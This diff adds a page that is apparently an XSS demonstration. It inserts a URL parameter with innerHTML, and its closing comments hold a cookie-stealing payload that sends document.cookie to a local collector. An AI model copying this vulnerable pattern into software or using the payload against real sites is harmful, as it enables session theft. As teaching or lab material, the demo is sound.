@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <div>Welcome, <span id="username"></span>!</div>
+  </body>
+  <script>
+    // Function to set a cookie, mostly this will be set from server
+    function setCookie(name, value, days) {
+      const date = new Date();
+      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+      const expires = "expires=" + date.toUTCString();
+      document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    }
+
+    // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
+    setCookie("exampleCookie", "Hello, Cookie!", 7);
+  </script>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const name = params.get("name");
+    document.getElementById("username").innerHTML = name;
+  </script>
+</html>
+
+<!-- ?name=<img src=\"does-not-exist\" onerror=\"var img=document.createElement(\'img\');img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\"> -->
+<!-- encodeURI -->
+<!-- ?name=%3Cimg%20src=%22does-not-exist%22%20onerror=%22var%20img=document.createElement('img');img.src=%60http://127.0.0.1:5501/cookie?data=$%7Bdocument.cookie%7D%60;document.querySelector('body').appendChild(img);%22%3E -->
